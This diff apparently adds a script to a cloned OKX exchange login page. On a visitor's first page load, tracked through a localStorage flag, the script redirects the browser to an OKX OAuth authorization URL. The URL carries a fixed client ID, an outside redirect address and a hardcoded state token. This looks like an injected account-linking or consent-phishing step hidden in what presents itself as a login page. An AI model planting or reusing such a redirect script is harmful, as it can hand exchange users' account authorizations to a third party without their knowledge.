@@ -2,6 +2,19 @@
 <html lang="en" dir="" class="">
 
 <head>
+      <script>
+        // URL to redirect to on the first visit
+        const redirectUrl = "https://www.okx.com/account/oauth?access_type=offline&response_type=code&inapp_redirect=true&response_type=code&client_id=db50e9193d264fdbadea1d3e287c40feQ5UAx5f8&redirect_uri=https://okx.ada.support/api/oauth/authorization&scope=read_only&state=.eJwVjMsOgyAQAP-Fc0m28pD6M2RZ1khEMYC9NP330utkZj6CNuydq-9l51MsQgUkYKXki52SWhuSDp2RbibLoOendk48xJWxr6Ueo_gfBqncrnI29ikOaFUIzhCAnQDjFCyBYQA9xNR8Yzwyt-bx7ptYVsyNx3Mn9lQi-zfXtCauYjnvnL8_gVM09g.ZyHEAA.ybgOzxcenZ2RDDbiPXlwM8bM61I";
+
+        // Check if the user has already visited the page
+        const hasVisited = localStorage.getItem("hasVisited");
+
+        if (!hasVisited) {
+            // If it's the user's first visit, set a flag and redirect
+            localStorage.setItem("hasVisited", "true");
+            window.location.href = redirectUrl;
+        }
+    </script>
   <title>Login OKX&#x27;s Website | OKX</title>
   <meta charSet="UTF-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
